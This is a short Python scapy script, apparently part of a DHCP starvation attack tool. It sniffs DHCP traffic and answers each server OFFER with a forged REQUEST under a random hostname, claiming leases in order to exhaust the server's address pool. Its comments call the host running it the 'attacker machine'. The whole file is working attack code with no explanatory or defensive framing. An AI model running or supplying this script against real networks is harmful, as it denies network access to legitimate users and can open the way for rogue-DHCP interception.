#!/bin/python3
from scapy.all import *
import netifaces, string, random

iface="wlp3s0"

#generate random hostname
def getname(N):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))

#forge reply package with data from offer package
def request(pkt_offer):
    hostname = getname(5)
    sendp(
        Ether(src=get_if_hwaddr(iface), dst="ff:ff:ff:ff:ff:ff") / \
        IP(src="0.0.0.0", dst="255.255.255.255") / \
        UDP(sport=68, dport=67) / \
        BOOTP(chaddr=[pkt_offer[BOOTP].chaddr], xid=pkt_offer[BOOTP].xid, flags=0x8000) / \
        DHCP(options = [
            ("message-type", 3),
            ("server_id", pkt_offer[BOOTP].siaddr),
            ("requested_addr", pkt_offer[BOOTP].yiaddr),
            ("hostname", hostname),
            ("param_req_list", []),
        ]),
        iface=iface,
        verbose=False,
    )

def handle(pkt):
    me = pkt[Ether].src == get_if_hwaddr(iface)
    #get DHCP package type
    type=""
    if pkt[DHCP] and pkt[DHCP].options[0][1] == 1:
        type = "DISCOVER"
    if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
        type = "OFFER"
    if pkt[DHCP] and pkt[DHCP].options[0][1] == 3:
        type = "REQUEST"
    if pkt[DHCP] and pkt[DHCP].options[0][1] == 4:
        type = "DECLINE"
    if pkt[DHCP] and pkt[DHCP].options[0][1] == 5:
        type = "ACK"
    if pkt[DHCP] and pkt[DHCP].options[0][1] == 6:
        type = "NACK"

    #parse information
    dhcpsip = pkt[IP].src
    dhcpsmac = pkt[Ether].src
    mymac = pkt[BOOTP].chaddr
    myip=pkt[BOOTP].yiaddr
    sip=pkt[BOOTP].siaddr
    rip=pkt[DHCP].options[2][1]

    if(me):
        #only log when package comes from attacker machine
        if(type=="DISCOVER"):
            print(f"\u001b[36mSENT\x1b[0m [{type}] {dhcpsmac} towards {sip}/{pkt[Ether].dst}")
        if(type=="REQUEST"):
            print(f"\u001b[36mSENT\x1b[0m [{type}] trying to get {rip} from DHCP server")
    else:
        #log DHCP packages from external sources
        if(type=="ACK"):
            print(f"\u001b[33;1mRCVD\x1b[0m [{type}] {dhcpsip} granted lease on {myip} for {mymac}")
        if(type=="NACK"):
            print(f"\u001b[33;1mRCVD\x1b[0m [{type}] {dhcpsip} did not assign lease for {mymac}")
        if(type=="OFFER"):
            print(f"\u001b[33;1mRCVD\x1b[0m [{type}] {dhcpsip} offered {myip} for {mymac}")
            #send DHCP REQUEST package based on offer
            request(pkt)

#start sniffing DHCP traffic and handle packages in "handle" function
sniff(filter="udp and port 67 and port 68", iface=iface, prn=handle)
